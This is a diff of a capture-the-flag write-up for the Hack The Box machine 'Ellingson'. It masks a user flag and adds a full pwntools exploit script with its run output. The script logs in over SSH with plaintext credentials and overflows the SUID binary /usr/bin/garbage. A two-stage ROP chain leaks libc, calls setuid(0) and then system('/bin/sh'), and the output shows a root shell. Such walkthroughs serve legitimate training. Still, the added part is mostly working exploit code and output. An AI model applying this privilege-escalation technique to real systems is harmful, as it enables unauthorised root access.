@@ -184,7 +184,7 @@ From here we can grab the user flag
 margo@ellingson:~$ ls
 user.txt
 margo@ellingson:~$ cat user.txt
-d0ff9e3f9da8bb00aaa6c0bb73e45903
+d0ff9e3f9da8bb0****************
 ```
 Now the next step could have been very obvious to you or may have needed some enumeration, depends if you have seen the movie or not. I personally saw the movie therefore I knew to look for a <b>garbage</b> file. I found it using the <b>locate</b> command and I see that the <b>SUID</b> bit is set.
 ```
@@ -384,14 +384,99 @@ Lastly, use <b>pattern_offset</b> in combination with the <b>RSP</b> memory addr
 gdb-peda$ pattern_offset 0x416d41415141416c
 4714496133718688108 found at offset: 135
 ```
-Next we need to find the <b>puts</b> call for the <b>Procedure Linkage Table(plt)</b> and the <b>Global Offset Table(got)</b>. This can be done using <b>objdump</b>. With this we can see the <b>plt = 0x401050</b> and the <b>got = 0x404028</b>
+With that done, now we can write our exploit. Normally we would have to find all of the memory address manually but with the use of <b>pwntools</b>, it can all be done automatically. The script below is what I used.
 ```
-# objdump -D garbage | grep puts
-0000000000401050 <puts@plt>:
-  401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
+#!/usr/bin/env python
+
+from pwn import *
+
+s = ssh(host="10.10.10.139", user="margo", password="iamgod$08")
+
+p = s.process('/usr/bin/garbage')
+#p = process('./garbage')
+#p = gdb.debug('./garbage', 'b auth')
+
+context(os="linux", arch="amd64")
+#context.log_level = 'DEBUG'
+
+log.info("Mapping binaries")
+garbage = ELF('garbage')
+rop = ROP(garbage)
+libc = ELF('libc.so.6')
+
+junk = "A"*136
+rop.search(regs=['rdi'], order = 'regs')
+rop.puts(garbage.got['puts'])
+rop.call(garbage.symbols['auth'])
+log.info("Stage 1 ROP Chain:\n" + rop.dump())
+
+
+payload = junk + str(rop)
+
+p.sendline(payload)
+p.recvuntil('denied.')
+leaked_puts = p.recv()[:8].strip().ljust(8, "\x00")
+log.success("Leaked puts@GLIBCL: " + str(leaked_puts))
+leaked_puts = u64(leaked_puts)
+
+#Stage 2
+libc.address = leaked_puts - libc.symbols['puts']
+rop2 = ROP(libc)
+rop2.setuid(0)
+rop2.system(next(libc.search('/bin/sh\x00')))
+log.info("Stage 2 ROP CHain: \n" + rop2.dump())
+
+payload = junk + str(rop2)
+p.sendline(payload)
+
+p.recvuntil("denied.")
+
+p.interactive()
 ```
-Now we need to find the <b>rdi</b>. This can be done using <b>ROPgadget</b>.
+Executing the script will spawn a root shell where we can grab the root flag
 ```
-# ROPgadget --binary garbage | grep 'pop rdi'
-0x000000000040179b : pop rdi ; ret
+# python exploit2.py
+[+] Connecting to 10.10.10.139 on port 22: Done
+[*] margo@10.10.10.139:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     Enabled
+[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 4428
+[*] Mapping binaries
+[*] '/root/Documents/Ellingson/garbage'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded cached gadgets for 'garbage'
+[*] '/root/Documents/Ellingson/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Stage 1 ROP Chain:
+    0x0000:         0x40179b pop rdi; ret
+    0x0008:         0x404028 [arg0] rdi = got.puts
+    0x0010:         0x401050 puts
+    0x0018:         0x401513 0x401513()
+[+] Leaked puts@GLIBCL: yO(\x00\x00
+[*] Loaded cached gadgets for 'libc.so.6'
+[*] Stage 2 ROP CHain:
+    0x0000:   0x7fd02849855f pop rdi; ret
+    0x0008:              0x0 [arg0] rdi = 0
+    0x0010:   0x7fd02855c970 setuid
+    0x0018:   0x7fd02849855f pop rdi; ret
+    0x0020:   0x7fd02862ae9a [arg0] rdi = 140532007480986
+    0x0028:   0x7fd0284c6440 system
+[*] Switching to interactive mode
+
+# $ whoami
+root
+# $ cat /root/root.txt
+1cc73a448021ea81**************
 ```
+<br><br><br><br>
